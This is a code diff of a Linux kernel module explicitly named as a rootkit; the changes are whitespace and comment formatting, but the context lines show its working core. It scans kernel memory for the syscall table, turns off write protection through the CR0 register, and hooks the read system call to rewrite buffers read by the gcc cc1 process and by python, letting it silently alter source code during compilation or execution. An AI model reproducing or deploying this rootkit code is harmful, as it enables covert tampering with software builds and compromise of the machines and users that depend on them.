@@ -5,16 +5,16 @@
 #include <linux/sched.h> // current task_struct
 
 /* The sys_call_table is const but we can point our own variable at
-* its memory location to get around that.
-*/
+ * its memory location to get around that.
+ */
 unsigned long **sys_call_table;
 
 /* The control register's value determines whether or not memory is
-* protected. We'll need to modify it, to turn off memory protection,
-* in order to write over the read system call. Here we store the initial
-* control register value so we can set it back when we're finished 
-* (memory protection is generally good)!
-*/
+ * protected. We'll need to modify it, to turn off memory protection,
+ * in order to write over the read system call. Here we store the initial
+ * control register value so we can set it back when we're finished
+ * (memory protection is generally good)!
+ */
 unsigned long original_cr0;
 
 /* The prototype for the write syscall. This is where we'll store the original
@@ -26,12 +26,12 @@ asmlinkage long (*ref_sys_read)(unsigned int fd, char __user *buf, size_t count)
 asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count)
 {
     /* execute the original read call, and hold on to its return value
-    * now we can add whatever we want to the buffer before exiting
-    * the function.
-    */
+     * now we can add whatever we want to the buffer before exiting
+     * the function.
+     */
     long ret;
     ret = ref_sys_read(fd, buf, count);
-	
+
     if (ret >= 6 && fd > 2) {
         /* We can find the current task name from the current task struct
          * then use that to decide if we'd like to swap out data
@@ -39,7 +39,7 @@ asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count)
          * note: cc1 is the name of the task that opens source files
          * during compilation via gcc.
          */
-        if (strcmp(current->comm, "cc1") == 0 || 
+        if (strcmp(current->comm, "cc1") == 0 ||
             strcmp(current->comm, "python") == 0) {
             long i;
             for (i = 0; i < (ret - 6); i++) {
@@ -69,28 +69,28 @@ asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count)
  */
 static unsigned long **aquire_sys_call_table(void)
 {
-    	/* PAGE_OFFSET is a macro which tells us the offset where kernel memory begins,
-	* this keeps us from searching for our syscall table in user space memory
-  	* */
-	unsigned long int offset = PAGE_OFFSET;
-	unsigned long **sct;
-	/* Scan memory searching for the syscall table, which is contigious */
-	printk("Starting syscall table scan from: %lx\n", offset);
-	while (offset < ULLONG_MAX) {
-        	/* cast our starting offset to match the system call table's type */
-		sct = (unsigned long **)offset;
+    /* PAGE_OFFSET is a macro which tells us the offset where kernel memory begins,
+     * this keeps us from searching for our syscall table in user space memory
+     */
+    unsigned long int offset = PAGE_OFFSET;
+    unsigned long **sct;
+    /* Scan memory searching for the syscall table, which is contigious */
+    printk("Starting syscall table scan from: %lx\n", offset);
+    while (offset < ULLONG_MAX) {
+            /* cast our starting offset to match the system call table's type */
+        sct = (unsigned long **)offset;
 
-        	/* We're scanning for a bit pattern that matches sct[__NR_close] 
-         	* so we just increase 'offset' until we find it.
-         	* */
-		if (sct[__NR_close] == (unsigned long *) sys_close) {
-			printk("Syscall table found at: %lx\n", offset);
-			return sct;
-		}
+            /* We're scanning for a bit pattern that matches sct[__NR_close]
+             * so we just increase 'offset' until we find it.
+             */
+        if (sct[__NR_close] == (unsigned long *) sys_close) {
+            printk("Syscall table found at: %lx\n", offset);
+            return sct;
+        }
 
-		offset += sizeof(void *);
-	}
-	return NULL;
+        offset += sizeof(void *);
+    }
+    return NULL;
 }
 
 static int __init rootkit_start(void)
@@ -110,14 +110,14 @@ static int __init rootkit_start(void)
     // turn memory protection back on
     write_cr0(original_cr0);
 
-	return 0;
+    return 0;
 }
 
 static void __exit rootkit_end(void)
 {
-	if(!sys_call_table) {
-		return;
-	}
+    if(!sys_call_table) {
+        return;
+    }
 
     // turn off memory protection
     write_cr0(original_cr0 & ~0x00010000);
